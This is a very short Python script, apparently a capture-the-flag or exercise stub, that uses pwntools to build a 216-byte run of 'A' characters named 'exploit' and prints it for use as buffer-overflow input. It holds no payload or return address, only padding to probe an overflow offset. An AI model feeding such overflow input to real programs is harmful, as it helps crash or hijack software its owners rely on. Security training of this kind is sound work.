from pwn import *

buf = b'A' * 216
exploit = buf

sys.stdout.buffer.write(exploit)